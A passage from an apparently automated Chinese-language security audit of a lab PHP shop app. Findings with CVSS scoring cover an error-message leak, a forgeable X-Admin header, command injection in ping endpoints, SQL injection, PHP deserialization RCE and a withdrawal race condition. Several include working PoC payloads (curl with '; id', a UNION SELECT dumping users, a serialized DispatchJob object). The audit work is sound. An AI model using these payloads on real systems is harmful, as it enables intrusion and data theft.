  修复建议：生产环境捕获异常时只记录到日志，页面返回通用错误；避免把 DSN、消息、堆栈输出给客户端。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:42:52.936344+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 运营端点经 HTTP 访问 | lab30-shop/app/public/ops/database.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需 GET probe=archive，无需特殊构造 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator 或 admin 会话 | lab30-shop/app/public/ops/database.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在应用自身边界内 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 泄露异常类名、消息与堆栈，含数据库主机/库/用户名信息 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/public/ops/database.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读诊断 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不影响可用性 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'database_infoleak_poc.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<operator_session>' 'http://target/ops/database.php?probe=archive'", 'instructions': '用 operator/admin 会话 Cookie 访问 /ops/database.php?probe=archive，观察 <pre> 中是否出现 PDOException 类名、数据库主机/库/用户名与堆栈。', 'normal_input': 'probe=main', 'attack_input': 'probe=archive', 'expected_result': 'probe=main 显示主数据源连接正常；probe=archive 返回异常类名、getMessage() 与完整堆栈信息。'}
````

- ops/database.php 强制连接未配置归档库并将 PDO 异常消息与调用栈回显到页面（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N，验证：unverified）
  来源 `067c815595c24ed29e11971eff65db44` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/database.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 62, 'end_line': 67}]
  结论：第3行在 probe=archive 时刻意使用不存在的库名 shop_archive_unconfigured 构造 PDO，捕获 Throwable 后把 get_class($e)、$e->getMessage() 与 $e->getTraceAsString() 拼成 $output；第4行仅以 h() 转义后放入 <pre> 返回给客户端。h() 只做 HTML 实体转义，不裁剪异常文本，因此可向持有运营/管理员会话者泄露数据库主机、库名、用户名等 DSN 片段，以及服务器文件路径、函数调用栈与框架/依赖细节。全局异常处理器（bootstrap.php:62-67）本可将错误改为通用文案，但此处的局部 catch 绕过了该保护。
  输入：GET 参数 probe，取值 archive 时选择未配置的库名，使 PDO 构造必然抛异常
  传播：probe=archive -> $schema='shop_archive_unconfigured' -> new PDO(...) 抛 PDOException -> catch(Throwable $e) -> $output=get_class().': '.getMessage()."\n".getTraceAsString() -> page() 回调中 h($output) 输出到 <pre>
  危险操作：将异常消息与 getTraceAsString() 调用栈原样回显到 HTTP 响应
  保护：仅有 h() 的 HTML 转义（bootstrap.php:10），不限制内容；局部 catch 绕开了 bootstrap.php:62-67 的通用错误页
  前提：['持有 operator 或 admin 角色会话（require_user 在第2行强制）；无需其他输入，GET probe=archive 即触发']
  修复建议：移除向客户端回显异常消息与调用栈的 catch 分支；归档数据源改为显式配置并做可用性探测，失败时统一返回通用错误文案，详情仅写入 error_log。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:47:19.385227+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 参数触发，网络可达 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 单个 probe=archive 参数即可稳定触发连接失败 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求 operator/admin 会话，属低权限角色 | lab30-shop/app/public/ops/database.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行发起请求，无需他人交互 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 泄露发生在同一应用边界内，未改变授权范围 | lab30-shop/app/public/ops/database.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 泄露 DSN 主机/库名/用户名与文件路径、调用栈等配置细节 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读诊断页面，不修改数据 | lab30-shop/app/public/ops/database.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'database_probe_info_leak.txt', 'language': 'text', 'script': 'GET /ops/database.php?probe=archive HTTP/1.1\nHost: <target>\nAccept: text/html\nCookie: SHOPSESSID=<operator 或 admin 会话>\n\n# 观察响应 <pre> 中是否出现 PDOException 文本、数据库主机/库名/用户名以及 #0 /path/to/... 形式的调用栈行', 'instructions': '先以 operator 或 admin 账号登录获取会话 Cookie，再向目标 /ops/database.php 发送 probe=archive 请求，对比 probe=main 时的正常输出。', 'normal_input': 'GET /ops/database.php?probe=main（连接正常时显示“主数据源连接正常。”）', 'attack_input': 'GET /ops/database.php?probe=archive', 'expected_result': 'probe=main 只显示成功文案；probe=archive 的 <pre> 中出现 PDOException 消息、DSN 中的主机/库名/用户名片段以及 getTraceAsString() 的调用栈和文件路径。'}
````

- ops/database.php 强制连接未配置归档库并将 PDO 异常消息与调用堆栈回显到页面（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N，验证：unverified）
  来源 `3e1856002aa9468392f734c69bbbe117` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/database.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：database.php:2 要求 operator/admin 会话，第3行在 probe=archive 时以未配置 schema 新建 PDO，失败时捕获 Throwable 并将 get_class、getMessage（含 mysql 主机、库名、用户名）与 getTraceAsString 调用堆栈拼入 $output；第4行把 $output 放进 <pre> 输出。h() 仅做 HTML 转义，不阻止敏感信息泄露。
  输入：GET 参数 probe（选择 archive 触发未配置数据源）
  传播：database.php:3 probe=archive -> new PDO 连接失败抛异常 -> catch 拼接异常消息与堆栈 -> database.php:4 渲染到页面
  危险操作：将 PDO 异常消息（含 DSN 主机/库/用户名）与 getTraceAsString() 调用堆栈原样回显到 HTTP 响应
  保护：仅有 h() HTML 转义，不限制错误内容输出；无自定义错误消息
  前提：['持有 operator 或 admin 角色会话；GET probe=archive']
  修复建议：对用户展示通用错误消息，详细异常仅写入服务端日志；不要在页面输出 getTraceAsString 或含 DSN 的异常消息。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:48:35.252199+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 访问 | lab30-shop/app/public/ops/database.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 选择 archive 即稳定触发 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 会话 | lab30-shop/app/public/ops/database.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同应用内信息泄露 | lab30-shop/app/public/ops/database.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 泄露内部主机、库名、用户名与堆栈 | lab30-shop/app/public/ops/database.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 无数据修改 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/ops/database.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `c53bb6d528204d45a9639ffcd9e7898e`

- ops/maintenance.php 仅凭可伪造 X-Admin:1 请求头通过服务身份校验并非授权写入 jobs 表（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `3d2b9a4ca0a249768454f3a261e0bd58` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 26, 'end_line': 31}]
  结论：第3行仅检查 HTTP_X_ADMIN 是否为字符串 '1'，该值由请求头完全控制，无会话、IP 或共享密钥校验；通过后第4行以服务身份向 jobs 表插入作业并回显 job_id。任意未认证攻击者发送 X-Admin: 1 即可冒充内部维护服务。
  输入：HTTP 请求头 X-Admin
  传播：$_SERVER['HTTP_X_ADMIN'] 通过 ==='1' 判定后直接进入 POST 分支的 jobs 插入
  危险操作：db()->prepare("INSERT INTO jobs(...)")->execute 以指定 user_id=4 写入作业记录
  保护：仅有客户端可控的 HTTP_X_ADMIN 头比较，无认证/共享密钥/来源限制
  前提：['攻击者可直接访问 /ops/maintenance.php 并发送 POST 请求，请求头 X-Admin: 1']

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:43:58.353285+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程直达 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需设置一个请求头 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无登录或角色要求 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一组件内权限判定被绕过 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 无读取数据证据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 非授权写入作业队列记录 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `1f604f325b644c6dae2a34e5890dfd90`

- ops/batch-check.php 将 GET host 传入 host_check 拼接 shell_exec，形成命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `b8b4992ef95041138a4641e9403ad319` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/batch-check.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/host_check.php', 'start_line': 1, 'end_line': 2}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：batch-check.php:2 直接取 $_GET['host'] 传给 host_check()；host_check.php:2 将 $host 原样拼接到 shell_exec('ping -c 1 -W 1 '.$host)，无 escapeshellarg 或白名单，攻击者可注入分号/管道执行任意命令，输出回显在页面 pre 中。
  输入：GET 参数 host
  传播：$_GET['host'] -> host_check($host) -> shell_exec('ping -c 1 -W 1 ' . $host)
  危险操作：shell_exec 执行拼接了用户输入的 shell 命令
  保护：无转义、无主机名白名单；仅 require_user(['operator','admin']) 限制登录角色
  前提：['攻击者持有 operator 或 admin 角色会话（注册后是否有提权路径未验证）']

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:43:58.355025+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 接口可远程访问 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造含 shell 元字符的 host 参数即可 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录且有 operator/admin 角色 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在该应用进程上下文 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意命令可读取系统数据 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 任意命令可写文件/改状态 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可中断服务 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `c90f2b61799742228c366125d6b3798c`

- ops/members.php 通过 member_lookup() 以 $_GET['q'] 直接拼接 LIKE 子句导致 SQL 注入（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N，验证：unverified）
  来源 `74e42e0e2e3a4bb9889ab5836b9b391f` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 3, 'end_line': 3}]
  结论：members.php 读取 $_GET['q'] 并原样传入 member_lookup()，后者用字符串拼接构造 "... WHERE username LIKE '%" . $term . "%'" 并直接 query() 执行，无参数化、无转义、无类型约束，攻击者可闭合引号注入任意 SQL，结果通过页面表格与 JSON 响应返回。
  输入：$_GET['q']（members.php:2）
  传播：members.php:2 $term → member_lookup($term) → member_lookup.php:3 字符串拼接进 SQL → db()->query() 执行
  危险操作：db()->query() 执行拼接后的 SQL 语句
  保护：仅 require_user(['operator','admin']) 身份校验；无参数化、无转义、无白名单，PDO 模拟预处理关闭也无法防护拼接型注入
  前提：['持有 operator 或 admin 角色会话访问 /ops/members.php']
  修复建议：使用预处理绑定 LIKE 参数，如 db()->prepare('... WHERE username LIKE ?')->execute(['%'.$term.'%'])

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:45:44.009663+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 参数可达 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 闭合单引号即可注入，无额外条件 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 登录会话 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身发起请求 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响仍在同一数据库/应用范围 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取 users 表任意列含邮箱、角色 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 查询语句处注入，写能力取决于数据库权限，未证实写入 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性破坏证据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_members.sh', 'language': 'bash', 'script': 'curl -s -H \'Cookie: SHOPSESSID=<operator_sid>\' --get \'http://target/ops/members.php\' --data-urlencode "q=%\' UNION SELECT 1,username,email,role FROM users-- -"', 'instructions': '以 operator 账号登录取得会话 Cookie，请求 /ops/members.php 并在 q 参数注入 UNION 查询', 'normal_input': 'q=alice', 'attack_input': "q=%' UNION SELECT 1,username,email,role FROM users-- -", 'expected_result': '正常输入只返回匹配会员；注入输入返回全表用户姓名/邮箱/角色'}
````


### 台账 `63b82922f003437a85edbdf1c0f4815d`

- ops/ping.php 将 $_GET['host'] 直接拼接进 shell_exec('ping ...') 造成命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `e869dad924934e3393e5a33985ba42dc` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/ping.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/public/ops/ping.php', 'start_line': 3, 'end_line': 3}]
  结论：ping.php 取 $_GET['host'] 后直接拼接为 'ping -c 1 -W 1 '.$host 交给 shell_exec 执行，无 escapeshellarg、无白名单校验，攻击者可用 ; | $() 等注入任意系统命令，并将命令输出回显到页面 pre 元素。
  输入：$_GET['host']
  传播：ping.php:2 $host → 字符串拼接进 shell_exec 命令 → 输出 $output → ping.php:3 h($output) 回显
  危险操作：shell_exec('ping -c 1 -W 1 ' . $host)
  保护：仅 require_user(['operator','admin'])，无参数转义或输入白名单
  前提：['持有 operator 或 admin 角色会话访问 /ops/ping.php?host=...']
  修复建议：使用 escapeshellarg($host) 并对主机名做严格正则白名单校验，或改用 proc_open 参数数组形式

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:45:44.012101+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 可达 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接使用 shell 元字符即可注入 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator/admin 会话 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行触发 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 命令在应用服务器进程上下文执行 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意命令输出被回显，可读系统文件/配置 | lab30-shop/app/public/ops/ping.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | shell_exec 可执行任意写操作 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏服务可用性 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'cmdi_ping.sh', 'language': 'bash', 'script': "curl -s -H 'Cookie: SHOPSESSID=<operator_sid>' --get 'http://target/ops/ping.php' --data-urlencode 'host=127.0.0.1; id'", 'instructions': '以 operator 会话请求 /ops/ping.php，host 参数追加 ; id', 'normal_input': 'host=127.0.0.1', 'attack_input': 'host=127.0.0.1; id', 'expected_result': '正常输入仅返回 ping 结果；注入输入额外返回 id 命令输出'}
````


### 台账 `b2d0817258ff487188b28f8bc7cd0db2`

- ops/jobs.php 对用户提交数据 unserialize，触发 DispatchJob::__wakeup 中的 shell_exec 造成命令执行（CVSS 3.1 Base 9.9 (critical) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H，验证：unverified）
  来源 `bf74403e5580452a9a38c9c1ce241f3a` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：DispatchJob 声明 public string $command，__wakeup() 直接 echo (string)shell_exec($this->command)，对攻击者序列化数据反序列化即等价任意系统命令执行；未使用 allowed_classes 限制或签名校验。
  输入：ops/jobs.php POST 中的 base64 序列化数据
  传播：POST 数据 -> base64_decode -> unserialize -> DispatchJob::__wakeup -> shell_exec($this->command)
  危险操作：shell_exec 执行攻击者控制的命令字符串
  保护：仅 operator/admin 角色与 CSRF 校验
  前提：['持有 operator/admin 会话及有效 CSRF token 提交恶意序列化串']
  修复建议：改用 json_decode；如必须对象化则使用 allowed_classes 白名单并校验结构。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:46:33.592171+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 请求即可投递序列化载荷 | lab30-shop/app/src/dispatch_job.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 Object 序列化串设置 command 即可触发 | lab30-shop/app/src/dispatch_job.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 依赖 operator/admin 会话与 CSRF token | lab30-shop/app/src/bootstrap.php:33-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | C | shell_exec 使执行逃逸到操作系统命令层 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意命令可读取数据库凭据与文件 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 任意命令可写文件 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏服务 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'unser_rce_poc.py', 'language': 'python', 'script': 'import base64\npayload = b\'O:11:"DispatchJob":1:{s:7:"command";s:6:"id";}\'\nprint(base64.b64encode(payload).decode())', 'instructions': '生成 payload 后以 operator 会话连同 csrf token POST 到 /ops/jobs.php 的 data 字段。', 'normal_input': 'data=默认合法序列化对象', 'attack_input': 'data=base64(O:11:"DispatchJob":1:{s:7:"command";s:6:"id";})', 'expected_result': '响应体包含 id 命令输出（uid=...），正常输入仅输出 inventory-ready。'}
````


### 台账 `e4a7218f768c48a88dcc9d386be19973`

- ops/ping.php 将 GET host 拼接进 shell_exec('ping ...') 造成命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `7910c9d2a39749eba3e8df1d598251c5` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/ping.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：ping.php 第2行 $host=(string)($_GET['host']??'') 未做任何转义/白名单即拼入 shell_exec('ping -c 1 -W 1 '.$host)。攻击者传入 host=127.0.0.1;id 之类 payload 即可在服务器执行任意 shell 命令，命令 stdout 经第3行 h($output) 回显到页面。
  输入：GET 参数 host
  传播：$host=(string)($_GET['host']??'') -> 'ping -c 1 -W 1 '.$host -> shell_exec(...) -> $output -> h($output) 回显
  危险操作：shell_exec 执行拼接了用户输入的 shell 命令
  保护：无；仅 require_user 角色校验，未使用 escapeshellarg 或输入白名单
  前提：['攻击者持有 operator 或 admin 角色会话（GET 请求即触发）']
  修复建议：避免拼接 shell；使用 escapeshellarg 并对 host 做严格 IP/主机名白名单校验，或改用 sockets 实现 ICMP。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:49:34.505339+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 运营页面可经网络访问 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接拼入分号/管道即可注入 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求 operator/admin 角色会话 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户交互 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在应用进程用户下执行命令 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 命令输出被回显，可读取任意文件/环境 | lab30-shop/app/public/ops/ping.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意命令修改服务器状态 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令执行可破坏可用性 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `494423ddc5fb4859bd074dca9235a8c5`

- wallet/withdraw.php 先查余额后写回且中间 sleep，可并发提现透支余额（竞态条件）（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：unverified）
  来源 `4a541389dec54031ac546f919c7472ba` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/wallet/withdraw.php', 'start_line': 2, 'end_line': 11}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
